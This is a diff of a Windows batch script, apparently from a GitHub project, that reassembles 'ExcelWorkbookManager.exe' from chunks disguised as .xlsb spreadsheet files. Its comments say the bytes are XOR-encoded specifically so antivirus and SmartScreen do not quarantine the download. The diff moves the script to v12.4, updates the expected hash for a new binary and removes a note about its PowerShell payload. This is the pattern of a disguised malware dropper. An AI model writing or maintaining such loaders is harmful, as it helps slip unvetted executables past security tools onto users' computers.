@@ -3,7 +3,7 @@ setlocal
 pushd "%~dp0"
 
 rem ============================================================
-rem Excel Workbook Manager - Beta v12.3 reassembly script
+rem Excel Workbook Manager - Beta v12.4 reassembly script
 rem
 rem Each .part??.xlsb chunk is the corresponding 8 MB slice of
 rem ExcelWorkbookManager.exe with every byte XOR'd against 0xAA.
@@ -11,15 +11,9 @@ rem That keeps the chunks from looking like a Windows executable
 rem on disk so antivirus / SmartScreen don't quarantine the
 rem GitHub download. We undo the XOR here, concatenate, and
 rem verify the SHA-256 of the resulting .exe.
-rem
-rem The PowerShell payload below is a single line (no ^ line
-rem continuations) because cmd.exe handles those inconsistently
-rem on some Windows installs and PowerShell ends up seeing the
-rem ^ characters as literals, which is what was breaking the
-rem previous version of this script.
 rem ============================================================
 
-set "EXPECTED_SHA=114734AAE5EE6FC39110535D7BAC804EFDAA68437CE5D36DEC8C084EE2D16788"
+set "EXPECTED_SHA=47558E777D9AAE1FDC0DFC473742C1E1B1048A4FDB15E844875A900624635A9E"
 set "OUT=ExcelWorkbookManager.exe"
 
 echo.
